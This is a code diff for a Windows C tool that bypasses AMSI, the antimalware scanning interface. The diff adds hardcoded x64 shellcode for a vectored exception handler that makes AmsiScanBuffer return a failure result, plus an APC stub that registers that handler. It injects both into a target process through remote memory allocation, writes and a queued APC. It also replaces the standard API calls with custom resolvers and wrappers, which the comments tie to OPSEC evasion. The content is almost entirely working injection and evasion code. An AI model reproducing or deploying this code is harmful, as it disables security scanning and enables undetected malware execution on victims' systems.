@@ -1,19 +1,48 @@
-#include <windows.h>
-#include <stdio.h>
-#include <stdint.h>
+#include "AMSIBypass.h"
 
-// Assume these are generated via xxd from the .bin files
-extern unsigned char veh_bin[];
-extern unsigned int veh_bin_len;
+// These are generated via xxd from the .bin files
+UCHAR veh_bin[] = {
+  0x4c, 0x8b, 0x41, 0x08, 0x4c, 0x8b, 0x09, 0x41, 0x8b, 0x01, 0x3d, 0x01,
+  0x00, 0x00, 0x80, 0x74, 0x11, 0x3d, 0x03, 0x00, 0x00, 0x80, 0x74, 0x35,
+  0x3d, 0x04, 0x00, 0x00, 0x80, 0x74, 0x52, 0x31, 0xc0, 0xc3, 0x4d, 0x8b,
+  0x98, 0xf8, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x15, 0xc8, 0x00, 0x00, 0x00,
+  0x4d, 0x8b, 0x12, 0x4d, 0x39, 0xd3, 0x75, 0x07, 0xe8, 0x94, 0x00, 0x00,
+  0x00, 0xeb, 0x53, 0x41, 0x81, 0x48, 0x44, 0x00, 0x01, 0x00, 0x00, 0xb8,
+  0xff, 0xff, 0xff, 0xff, 0xc3, 0x4c, 0x8d, 0x15, 0xa4, 0x00, 0x00, 0x00,
+  0x4d, 0x8b, 0x12, 0x4d, 0x89, 0x50, 0x48, 0x49, 0xc7, 0x40, 0x60, 0x01,
+  0x00, 0x00, 0x00, 0x49, 0x83, 0x80, 0xf8, 0x00, 0x00, 0x00, 0x01, 0xb8,
+  0xff, 0xff, 0xff, 0xff, 0xc3, 0x4d, 0x8b, 0x98, 0xf8, 0x00, 0x00, 0x00,
+  0x4c, 0x8d, 0x15, 0x79, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x12, 0x4d, 0x39,
+  0xd3, 0x75, 0x0b, 0xe8, 0x45, 0x00, 0x00, 0x00, 0xb8, 0xff, 0xff, 0xff,
+  0xff, 0xc3, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0xc1, 0xff, 0xff, 0xff,
+  0xff, 0x48, 0x8d, 0x15, 0x5c, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x05, 0x5d,
+  0x00, 0x00, 0x00, 0x41, 0xb9, 0x20, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x5c,
+  0x24, 0x48, 0x4c, 0x89, 0x5c, 0x24, 0x20, 0x48, 0x8d, 0x05, 0x4e, 0x00,
+  0x00, 0x00, 0x48, 0x8b, 0x00, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x40, 0xb8,
+  0xff, 0xff, 0xff, 0xff, 0xc3, 0x41, 0xc7, 0x40, 0x78, 0x57, 0x00, 0x07,
+  0x80, 0x4d, 0x8b, 0x98, 0x98, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x13, 0x4d,
+  0x89, 0x90, 0xf8, 0x00, 0x00, 0x00, 0x49, 0x83, 0x80, 0x98, 0x00, 0x00,
+  0x00, 0x08, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0xaa, 0xaa, 0xaa, 0xaa,
+  0xaa, 0xaa, 0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb,
+  0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xcc, 0xcc, 0xcc, 0xcc,
+  0xcc, 0xcc, 0xcc, 0xcc
+};
+UINT veh_bin_len = 280;
 
-extern unsigned char apc_bin[];
-extern unsigned int apc_bin_len;
+UCHAR apc_bin[] = {
+  0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x01, 0x00, 0x00,
+  0x00, 0x48, 0xba, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48,
+  0xb8, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xdd, 0xff, 0xd0, 0xcc,
+  0x48, 0x83, 0xc4, 0x28, 0x5d, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+  0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c, 0x00
+};
+UINT apc_bin_len = 57;
 
 // Helper function to scan the shellcode array and patch 8-byte placeholders
-BOOL PatchPlaceholder(unsigned char* payload, size_t payloadSize, uint64_t placeholder, uint64_t value) {
-    for (size_t i = 0; i < payloadSize - 7; i++) {
-        if (*(uint64_t*)(&payload[i]) == placeholder) {
-            *(uint64_t*)(&payload[i]) = value;
+BOOL PatchPlaceholder(UCHAR* payload, SIZE_T payloadSize, ULONG64 placeholder, PVOID value) {
+    for (SIZE_T i = 0; i <= payloadSize - sizeof(ULONG64); i++) {
+        if (*(ULONG64*)(&payload[i]) == placeholder) {
+            *(PVOID*)(&payload[i]) = value;
             return TRUE;
         }
     }
@@ -23,15 +52,18 @@ BOOL PatchPlaceholder(unsigned char* payload, size_t payloadSize, uint64_t place
 BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread) {
     // 1. Resolve addresses locally. Due to ASLR design on Windows, system DLLs 
     // are mapped at the same base address across all processes in the same session.
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    HMODULE hKernel32 = CustomGetModuleHandleW(L"kernel32.dll");
+    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
     
-    // Force load amsi.dll locally to get the AmsiScanBuffer offset
     HMODULE hAmsi = LoadLibraryA("amsi.dll"); 
 
-    uint64_t pLoadLibraryA = (uint64_t)GetProcAddress(hKernel32, "LoadLibraryA");
-    uint64_t pRtlAddVeh = (uint64_t)GetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
-    uint64_t pAmsiScanBuffer = (uint64_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
+    PVOID pLoadLibraryA = (PVOID)CustomGetProcAddress(hKernel32, "LoadLibraryA");
+    PVOID pRtlAddVeh = (PVOID)CustomGetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
+    PVOID pAmsiScanBuffer = (PVOID)CustomGetProcAddress(hAmsi, "AmsiScanBuffer");
+    PVOID pNtProtect = (PVOID)CustomGetProcAddress(hNtdll, "NtProtectVirtualMemory");
+
+    PVOID pageBase = (PVOID)((ULONG_PTR)pAmsiScanBuffer & ~0xFFF); //take the aligned page base of AmsiScanBuffer (aligned on 4Kb)
+    SIZE_T pageSize = 0x1000; //4Kb
 
     if (!pLoadLibraryA || !pRtlAddVeh || !pAmsiScanBuffer) {
         printf("[-] Failed to resolve local API addresses.\n");
@@ -39,37 +71,36 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread) {
     }
 
     // 2. Patch VEH Stub Placeholder
-    if (!PatchPlaceholder(veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
-        printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
-        return FALSE;
-    }
+    PatchPlaceholder(veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer);
+    PatchPlaceholder(veh_bin, veh_bin_len, 0xBBBBBBBBBBBBBBBB, pageBase);
+    PatchPlaceholder(veh_bin, veh_bin_len, 0xCCCCCCCCCCCCCCCC, (PVOID)pageSize);
+    PatchPlaceholder(veh_bin, veh_bin_len, 0xDDDDDDDDDDDDDDDD, pNtProtect);
 
     // 3. Allocate and write VEH Stub (RW -> RX for OPSEC)
-    void* pRemoteVeh = VirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    PVOID pRemoteVeh = WrapperVirtualAllocEx(hProcess, NULL, veh_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteVeh) return FALSE;
-    WriteProcessMemory(hProcess, pRemoteVeh, veh_bin, veh_bin_len, NULL);
+    WrapperWriteProcessMemory(hProcess, pRemoteVeh, veh_bin, veh_bin_len, NULL);
     
     DWORD oldProtect;
-    VirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);
+    WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 
     // 4. Patch APC Stub Placeholders
     PatchPlaceholder(apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
-    PatchPlaceholder(apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, (uint64_t)pRemoteVeh);
+    PatchPlaceholder(apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, pRemoteVeh);
     PatchPlaceholder(apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);
 
     // 5. Allocate and write APC Stub
-    void* pRemoteApc = VirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteApc) return FALSE;
-    WriteProcessMemory(hProcess, pRemoteApc, apc_bin, apc_bin_len, NULL);
-    VirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);
+    WrapperWriteProcessMemory(hProcess, pRemoteApc, apc_bin, apc_bin_len, NULL);
+    WrapperVirtualProtectEx(hProcess, pRemoteApc, apc_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 
     printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
     printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);
 
     // 6. Queue the APC to the target thread
-    // Note: The thread must enter an alertable state (e.g., SleepEx, WaitForSingleObjectEx) 
-    // for the APC to fire. If hijacking a newly created suspended thread, it will fire on resume.
-    if (!QueueUserAPC((PAPCFUNC)pRemoteApc, hThread, NULL)) {
+    // it will fire on resume.
+    if (!WrapperQueueUserAPC((PAPCFUNC)pRemoteApc, hThread, 0)) {
         printf("[-] Failed to queue APC.\n");
         return FALSE;
     }
